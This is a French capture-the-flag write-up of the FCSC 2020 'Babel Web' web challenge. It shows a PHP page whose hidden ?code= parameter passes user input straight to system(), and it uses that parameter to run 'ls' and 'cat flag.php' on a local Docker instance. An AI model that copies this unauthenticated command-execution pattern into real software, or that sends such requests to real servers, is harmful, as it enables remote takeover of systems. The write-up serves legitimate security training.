# [Babel Web](https://hackropole.fr/fr/challenges/web/fcsc2020-web-babel-web/)

## Énoncé

On vous demande d’auditer ce site en cours de construction à la recherche d’un flag.

## Solution

On commence par se rendre sur le site après avoir lancé le docker.

On tombe sur une page ne comportant qu'un peu de texte.

On va donc regarder tout de suite le code source de la page.

```html
<html>
	<head>
		<title>Bienvenue à Babel Web!</title>
	</head>	
	<body>
		<h1>Bienvenue à Babel Web!</h1>
		La page est en cours de développement, merci de revenir plus tard.
		<!-- <a href="?source=1">source</a> -->
	</body>
</html>
```

On remarque un commentaire avec une route ```?source=1```.

On va donc se rendre sur cette route.

On tombe sur le code source de la page. Il s'agit d'un code PHP.

```php
<?php
    if (isset($_GET['source'])) {
        @show_source(__FILE__);
    }  else if(isset($_GET['code'])) {
        print("<pre>");
        @system($_GET['code']);
        print("<pre>");
    } else {
?>
<html>
    <head>
        <title>Bienvenue à Babel Web!</title>
    </head>    
    <body>
        <h1>Bienvenue à Babel Web!</h1>
        La page est en cours de développement, merci de revenir plus tard.
        <!-- <a href="?source=1">source</a> -->
    </body>
</html>
<?php
    }
?>
```

Je ne connais pas du tout PHP, mais je vois que la route ```?code=``` existe et fait un appel à la fonction ```system()```. Par mimétisme avec la méthode python ```os.system()```, je me dis que cette fonction doit exécuter une commande système.

On tente donc de passer une commande système en paramètre de la route ```?code=```.

```bash
http://localhost:8000/?code=ls
```

On obtient le résultat suivant :

```html
flag.php
index.php
```

On voit qu'il y a un fichier ```flag.php```. On va donc essayer de lire son contenu.

```bash
http://localhost:8000/?code=cat%20flag.php
```

On obtient une page vide...

Mais en regardant le code source de la page, on voit le flag. (Petit piège pour les gens qui vont vite... Sympa je me suis fait avoir aussi...)


## Flag

Le flag est dans le code source de la page ```flag.php``` que l'on obtient avec la requête ```http://localhost:8000/?code=cat%20flag.php```.